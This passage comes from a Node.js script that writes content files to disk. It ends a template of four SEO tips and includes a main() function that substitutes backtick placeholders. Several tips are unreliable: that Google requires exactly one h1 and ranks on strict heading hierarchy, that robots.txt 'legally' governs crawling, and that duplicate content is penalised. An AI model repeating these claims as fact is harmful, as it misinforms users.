1. **Semantic HTML**: Google ranks pages based on strict heading hierarchies. You must have exactly one TICK1<h1>TICK1 per page representing the core topic, followed by properly nested TICK1<h2>TICK1 and TICK1<h3>TICK1 tags.
2. **robots.txt**: A text file at the root of your domain that dictates exactly which directories the crawler is legally allowed to index, and which it must ignore (like TICK1/admin-panelTICK1).
3. **sitemap.xml**: A mathematically structured XML file that provides the crawler with a complete map of every valid URL on your site, prioritizing which pages are most important.
4. **Canonical URLs**: If you have 5 different URLs that point to the exact same product page, Google will penalize you for duplicate content. You must inject a TICK1<link rel="canonical" href="..."/>TICK1 tag to tell the bot which URL is the "Master" version.

</ConceptTemplate>
`,
}

async function main() {
  for (const [filePath, content] of Object.entries(contentMap)) {
    const fullPath = path.resolve(filePath)
    await fs.mkdir(path.dirname(fullPath), { recursive: true })

    // Safely replace TICK1 and TICK3 placeholders with actual backticks
    // This entirely avoids JSON/regex parsing issues.
    let finalContent = content.replace(/TICK3/g, TICK3).replace(/TICK1/g, TICK1)

    // Append a safe newline
    await fs.writeFile(fullPath, finalContent.trim() + '\n', 'utf-8')
    console.log('Wrote ' + filePath)
  }
}

main().catch(console.error)
